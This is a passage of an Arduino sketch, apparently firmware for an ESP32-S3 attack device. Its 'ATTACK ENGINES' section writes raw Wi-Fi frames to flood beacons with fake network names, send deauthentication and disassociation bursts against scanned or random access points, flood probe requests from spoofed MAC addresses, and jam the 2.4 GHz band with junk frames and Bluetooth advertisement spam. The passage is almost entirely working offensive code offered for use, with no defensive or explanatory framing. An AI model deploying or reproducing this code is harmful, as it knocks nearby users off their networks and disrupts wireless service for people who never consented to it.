ipv4shh/ESPTOOL2/ESP32_S3/ESP32_S3_ATTACK/ESP32_S3_ATTACK.ino
  packet[pos++] = 0x01;
  packet[pos++] = 0x04;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8b;
  packet[pos++] = 0x96;

  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ===== ATTACK ENGINES =====

void runBeaconSpamStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  static unsigned long lastBeaconHopTime = 0;
  int hopInterval = boost ? 150 : 300;
  if (millis() - lastBeaconHopTime >= hopInterval) {
    lastBeaconHopTime = millis();
    hopChannel();
    
    // Send a burst of beacons for multiple SSIDs on this channel
    int burstSize = boost ? 40 : 15;
    for (int i = 0; i < burstSize; i++) {
      char ssidBuf[32];
      getRealisticSSID(ssidBuf, ssidIndex);
      sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
      ssidIndex = (ssidIndex + 1) % 100;
      esp_task_wdt_reset();
      yield();
    }
    
    if (random(10) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[Beacon] Sent burst of %d beacons on ch %d%s", 
               burstSize, currentChannel, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
  }
}

void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00,                         // Type: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Seq
    0x00, 0x00                          // Reason code
  };
  
  memcpy(&packet[4], clientMac, 6);
  memcpy(&packet[10], apBssid, 6);
  memcpy(&packet[16], apBssid, 6);
  packet[24] = reason & 0xFF;
  packet[25] = (reason >> 8) & 0xFF;
  
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
  
  // Disassociation frame (0xA0)
  packet[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void runDeauthStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  if (millis() - lastAttackActionTime >= (boost ? 5 : 15)) {
    lastAttackActionTime = millis();
    
    uint8_t targetBSSID[6];
    uint8_t targetChannel = currentChannel;
    
    if (scannedCount > 0) {
      memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
      targetChannel = scannedChannels[deauthIndex];
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
      
      deauthIndex = (deauthIndex + 1) % scannedCount;
    } else {
      hopChannel();
      for (int i = 0; i < 6; i++) {
        targetBSSID[i] = random(256);
      }
      targetBSSID[0] &= 0xFE;
      targetBSSID[0] |= 0x02;
    }

    int burstSize = boost ? 10 : 3;
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (int i = 0; i < burstSize; i++) {
      sendDeauthFrame(targetBSSID, broadcastMac, 7);
      sendDeauthFrame(targetBSSID, broadcastMac, 1);
      
      uint8_t clientPacket[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
        0x00, 0x00,
        0x07, 0x00
      };
      memcpy(&clientPacket[4], targetBSSID, 6);
      memcpy(&clientPacket[16], targetBSSID, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
      
      clientPacket[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
      esp_task_wdt_reset();
      yield();
    }
    
    if (random(80) == 0) {
      char buf[64];
      if (scannedCount > 0) {
        snprintf(buf, sizeof(buf), "[Deauth] Targeted AP: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
                 targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                 targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
      } else {
        snprintf(buf, sizeof(buf), "[Deauth] Broad jamming on ch %d", targetChannel);
      }
      sendLogToMaster(buf);
    }
  }
}

void runProbeFloodStep() {
  esp_wifi_set_promiscuous(true);

  // Hop channel slowly (every 200ms) to ensure scan saturation on each channel
  static unsigned long lastProbeHopTime = 0;
  if (millis() - lastProbeHopTime >= 200) {
    lastProbeHopTime = millis();
    hopChannel();
  }

  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();

    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
      mac[i] = random(256);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;

    const char* ssid = "ProbeTest";
    uint8_t ssidLen = strlen(ssid);
    uint8_t probePacket[24 + 2 + 32] = {
      0x40, 0x00,
      0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };
    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[16], mac, 6);

    int pos = 24;
    probePacket[pos++] = 0x00;
    probePacket[pos++] = ssidLen;
    memcpy(&probePacket[pos], ssid, ssidLen);
    pos += ssidLen;

    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
    esp_task_wdt_reset();
    
    if (random(100) == 0) {
      sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
    }
  }
}

// Jammer that targets WiFi and Bluetooth bands simultaneously
void runPowerfulJammerStep() {
  esp_wifi_set_promiscuous(true);
  
  // Hopping channels as fast as possible to flood spectrum (throttled to 20ms to allow ESP-NOW)
  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();
    hopChannel();
    
    // Construct corrupted control packet to overflow receiver processing pipeline
    uint8_t junkPacket[64];
    for (int i = 0; i < 64; i++) {
      junkPacket[i] = random(256);
    }
    junkPacket[0] = 0x00; // Invalid type to cause receiver decode lock overhead
    
    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
  }
  
  // Concurrent BLE advertisement spam to flood BLE band
  if (!bleJammerInitialized) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
  }
  
  static unsigned long lastJamLog = 0;
  if (millis() - lastJamLog >= 3000) {
    lastJamLog = millis();
    sendLogToMaster("[Jammer] powerful_jammer active on 2.4GHz");
  }
}

// Wi-Fi Sniffer-based Scan Structs and variables
struct APInfo {
  char ssid[33];
  uint8_t bssid[6];
  int rssi;
  uint8_t channel;
  char security[12];
  bool wps;
};

#define MAX_APS 40
APInfo apList[MAX_APS];
int apCount = 0;

